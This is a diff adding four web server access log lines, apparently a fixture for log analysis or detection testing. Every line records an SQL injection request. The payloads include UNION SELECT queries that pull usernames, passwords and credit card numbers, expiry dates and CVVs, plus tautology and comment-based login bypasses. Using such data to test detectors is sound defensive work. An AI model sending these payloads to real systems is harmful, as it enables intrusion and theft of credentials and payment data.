@@ -1,0 +1,4 @@
+10.88.5.12 - - [12/Sep/2026:14:30:02 +0000] "GET /products.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 500 82 "-" "curl/8.0"
+10.88.5.12 - - [12/Sep/2026:14:30:03 +0000] "GET /products.php?id=1' OR '1'='1 HTTP/1.1" 500 91 "-" "curl/8.0"
+10.88.5.12 - - [12/Sep/2026:14:30:04 +0000] "GET /orders.php?id=99 UNION SELECT cc_number,cc_exp,cc_cvv FROM cards-- HTTP/1.1" 500 134 "-" "curl/8.0"
+10.88.5.12 - - [12/Sep/2026:14:30:05 +0000] "GET /login.php?email=a'-- HTTP/1.1" 200 77 "-" "curl/8.0"
